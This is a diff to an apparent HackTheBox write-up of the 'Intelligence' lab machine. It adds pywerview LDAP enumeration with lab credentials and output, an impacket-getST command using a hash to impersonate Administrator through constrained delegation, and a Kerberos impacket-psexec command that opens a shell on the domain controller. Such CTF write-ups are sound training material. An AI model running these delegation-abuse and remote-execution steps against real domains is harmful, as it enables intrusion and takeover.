@@ -2,7 +2,7 @@
 
 ## HackTheBox
 
-### Intelligence - Machine
+### Machine: Intelligence
 
 #### Machine Description
 
@@ -28,6 +28,7 @@
 - ldapsearch
 - nmap
 - nslookup
+- pywerview
 - responder
 - smbclient
 - zaproxy
@@ -1185,6 +1186,106 @@ SMB         10.10.10.248    445    DC               SYSVOL          READ        
 SMB         10.10.10.248    445    DC               Users  
 ```
 
+`pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.10.10.248`:
+```
+dnshostname: svc_int.intelligence.htb ←
+dnshostname: dc.intelligence.htb ←
+```
+
+`pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.10.10.248 --full-data`:
+```
+objectclass:                    top, person, organizationalPerson, user, computer, msDS-GroupManagedServiceAccount
+cn:                             svc_int ←
+distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb ←
+instancetype:                   4
+whencreated:                    2021-04-19 00:49:58+00:00
+whenchanged:                    2024-11-04 14:47:20+00:00
+usncreated:                     12846
+usnchanged:                     102506
+name:                           svc_int
+objectguid:                     {f180a079-f326-49b2-84a1-34824208d642}
+useraccountcontrol:             WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
+badpwdcount:                    0
+codepage:                       0
+countrycode:                    0
+badpasswordtime:                2024-11-04 15:06:02.500799+00:00
+lastlogoff:                     1601-01-01 00:00:00+00:00
+lastlogon:                      2024-11-04 15:33:44.000809+00:00
+localpolicyflags:               0
+pwdlastset:                     2024-11-04 14:46:54.110470+00:00
+primarygroupid:                 515
+objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
+accountexpires:                 9999-12-31 23:59:59.999999+00:00
+logoncount:                     8
+samaccountname:                 svc_int$
+samaccounttype:                 805306369
+dnshostname:                    svc_int.intelligence.htb
+objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
+iscriticalsystemobject:         False
+dscorepropagationdata:          1601-01-01 00:00:00+00:00
+lastlogontimestamp:             2024-11-04 14:47:20.282360+00:00
+msds-allowedtodelegateto:       WWW/dc.intelligence.htb ←
+msds-supportedencryptiontypes:  28
+msds-managedpasswordid:         010000004b44534b020000006a0100001a0000000000000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
+msds-managedpasswordpreviousid: 010000004b44534b020000006a010000170000001800000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
+msds-managedpasswordinterval:   30
+msds-groupmsamembership:        010004801400000000000000000000002400000001020000000000052000000020020000040050000200000000002400ff01... 
+
+objectclass:                   top, person, organizationalPerson, user, computer
+cn:                            DC
+usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050...
+distinguishedname:             CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
+instancetype:                  4
+whencreated:                   2021-04-19 00:42:41+00:00
+whenchanged:                   2024-11-04 14:45:03+00:00
+displayname:                   DC$
+usncreated:                    12293
+memberof:                      CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=intelligence,DC=htb, 
+                               CN=Cert Publishers,CN=Users,DC=intelligence,DC=htb
+usnchanged:                    102440
+name:                          DC
+objectguid:                    {f28de281-fd79-40c5-a77b-1252b80550ed}
+useraccountcontrol:            SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+badpwdcount:                   0
+codepage:                      0
+countrycode:                   0
+badpasswordtime:               1601-01-01 00:00:00+00:00
+lastlogoff:                    1601-01-01 00:00:00+00:00
+lastlogon:                     2024-11-04 15:14:26.125793+00:00
+localpolicyflags:              0
+pwdlastset:                    2024-11-04 14:44:38.891775+00:00
+primarygroupid:                516
+objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
+accountexpires:                9999-12-31 23:59:59.999999+00:00
+logoncount:                    323
+samaccountname:                DC$
+samaccounttype:                805306369
+operatingsystem:               Windows Server 2019 Datacenter
+operatingsystemversion:        10.0 (17763)
+serverreferencebl:             CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
+dnshostname:                   dc.intelligence.htb
+ridsetreferences:              CN=RID Set,CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
+serviceprincipalname:          ldap/DC/intelligence, HOST/DC/intelligence, RestrictedKrbHost/DC, HOST/DC, ldap/DC, 
+                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb, 
+                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb, 
+                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb, DNS/dc.intelligence.htb, 
+                               GC/dc.intelligence.htb/intelligence.htb, RestrictedKrbHost/dc.intelligence.htb, 
+                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
+                               HOST/dc.intelligence.htb/intelligence, HOST/dc.intelligence.htb, 
+                               HOST/dc.intelligence.htb/intelligence.htb, 
+                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb, 
+                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
+                               ldap/dc.intelligence.htb/intelligence, ldap/dc.intelligence.htb, 
+                               ldap/dc.intelligence.htb/intelligence.htb
+objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
+iscriticalsystemobject:        True
+dscorepropagationdata:         2021-04-19 00:42:42+00:00, 1601-01-01 00:00:01+00:00
+lastlogontimestamp:            2024-11-04 14:45:03.251097+00:00
+msds-supportedencryptiontypes: 28
+msds-generationid:             15885a6e1e9014de...
+msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=intelligence,DC=htb 
+```
+
 <❌ Failed Step>
 
 `impacket-getST 'intelligence.htb/svc_int$' -hashes ':1d7a055a77db01cde7db3f4d006081fb' -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -altservice 'cifs'`:
@@ -1240,7 +1341,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 </❌ Failed Step>
 
-`KRB5CCNAME=./Administrator.ccache impacket-psexec 'intelligence.htb/administrator@10.10.10.248' -k -no-pass`:
+`KRB5CCNAME=./Administrator.ccache impacket-psexec 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass`:
 ```
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
